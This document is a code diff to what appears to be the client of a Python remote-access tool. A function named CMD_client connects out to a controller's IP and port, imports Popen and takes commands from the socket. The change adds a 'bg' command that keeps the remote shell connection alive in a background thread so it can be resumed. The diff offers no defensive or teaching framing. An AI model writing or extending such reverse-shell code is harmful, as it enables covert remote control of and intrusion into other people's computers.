@@ -59,18 +59,27 @@ def PINGPONG_client_T(ip, port):
                 s.send(bytes("OK", "utf8"))
 #cmd_START_location
             elif data.decode() == "CMDSHELL_APP":
-                def CMD_client(ip, port, s):
+                def CMD_client(ip, port, s, is_connect=False, cmd_c=None):
                     from subprocess import Popen, PIPE
                     try:
-                        try:
-                            cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            cmd_c.connect((ip, port))
-                        except socket.error:
-                            sys.exit(1)
+                        if is_connect == False:
+                            try:
+                                cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                cmd_c.connect((ip, port))
+                            except socket.error:
+                                sys.exit(1)
                         while True:
                             cmd_command = cmd_c.recv(1024)
                             if cmd_command.decode("utf8") == "exit" or cmd_command.decode("utf8") == "EXIT":
                                 cmd_c.close()
+                                s.send(b'BACK')
+                                break
+                            elif cmd_command.decode('utf8') == 'bg' or cmd_command.decode('utf8') == 'BG':
+                                def wait():
+                                    cmd_c.recv(1024)
+                                    CMD_client(ip, port, s, is_connect=True, cmd_c=cmd_c)
+                                t_cmd = threading.Thread(target=wait)
+                                t_cmd.start()
                                 s.send(b'BACK')
                                 break
                             elif cmd_command.decode("utf8") == "PING":
